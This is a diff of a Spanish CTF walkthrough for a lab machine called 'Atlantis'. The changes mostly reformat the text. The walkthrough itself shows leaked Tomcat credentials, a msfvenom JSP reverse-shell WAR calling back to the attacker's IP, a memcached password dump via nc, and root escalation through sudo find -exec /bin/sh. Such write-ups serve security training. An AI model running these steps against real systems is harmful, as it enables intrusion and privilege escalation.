@@ -107,10 +107,10 @@ pero si miramos el codigo tiene un par de lienas comentadas
 
 hay un repo de github  de SuperCMS, nos descargamos el repositorio y accedemos a la carpeta
 
-'❯ git clone https://github.com/aquilino/SuperCMS.git
+❯ git clone https://github.com/aquilino/SuperCMS.git
 cd SuperCMS
 le hacemos un  git log y miramos los commits
-buscamos algun commit sospechoso  y veremos uno que crea un archivo de texto knocking_on_Atlantis_door.txt' 
+buscamos algun commit sospechoso  y veremos uno que crea un archivo de texto knocking_on_Atlantis_door.txt 
 
 ❯ git log -c 58afe63a1cd28fa167b95bcff50d2f6f011337c1
 commit 58afe63a1cd28fa167b95bcff50d2f6f011337c1
@@ -211,7 +211,9 @@ passwword_zip = agua=H2O
 
 una vez descomprimido encotramos un archivo critico de tomcat donde se guardan las credenciales de usuario
 
-'<user username="aquaMan" password="P4st3lM4n" roles="manager-gui,admin-gui"/>'
+~~~
+<user username="aquaMan" password="P4st3lM4n" roles="manager-gui,admin-gui"/>
+~~~
 
 ## *Credenciales* 
 
@@ -222,7 +224,7 @@ con estas credenciales accedemos al servicio tomcat
 
 como veremos podemos hacer un deploy de un archivo war que con msfvenom crearemos.
 
-## MSFVENOM
+## *MSFVENOM*
 
 ❯ msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.0.55 LPORT=443 -f war -o shell.war
 Payload size: 1091 bytes
@@ -258,7 +260,9 @@ stty rows 57 columns 212
 
 si le hacemos un ps aux verermos que usa memcached
 
-'/usr/bin/memcached -m 64 -p 11211 -u memcache -l 127.0.0.1'
+~~~
+/usr/bin/memcached -m 64 -p 11211 -u memcache -l 127.0.0.1
+~~~
 
 probaremos a entrar nc localhost 11211
 
@@ -270,7 +274,8 @@ nos hace un volcado de memoria y veremos mas informacion
 
 con get y el item que queremos nos lo reportara
 
-'stats cachedump 1 100
+~~~
+stats cachedump 1 100
 ITEM email [17 b; 0 s]
 ITEM Name [14 b; 0 s]
 ITEM password [18 b; 0 s]
@@ -283,7 +288,8 @@ END
 get password
 VALUE password 0 18
 N3ptun0D10sd3lM4r$
-END'
+END
+~~~
 
 si miramos el /etc/passwd veremos quiene es el user Poseidon perez
 
@@ -295,7 +301,8 @@ tridente
 Atlantis
 
 
-#Escalada de Privilegios
+## *Escalada de Privilegios*
+
 con sudo -l podemos ejecutar el binario find que se encuentra en la carpeta /home/tridente
 tridente@hidr0Gen:~$ sudo -l
 [sudo] password for tridente: 
@@ -307,11 +314,11 @@ User tridente may run the following commands on Atlantis:
 
 tridente@Atlantis:~$ sudo -u root /home/tridente/find . -exec /bin/sh \; -quit
 [sudo] password for tridente: 
-\# id;whoami;hostname
+# id;whoami;hostname
 uid=0(root) gid=0(root) groups=0(root)
 root
 Atlantis
-\#
+#
 
 si miramos la flag esta encriptada  la pasaremos a nuestra terminal Y usaremos gpg2john y luego con john intentamos romperlo.
 
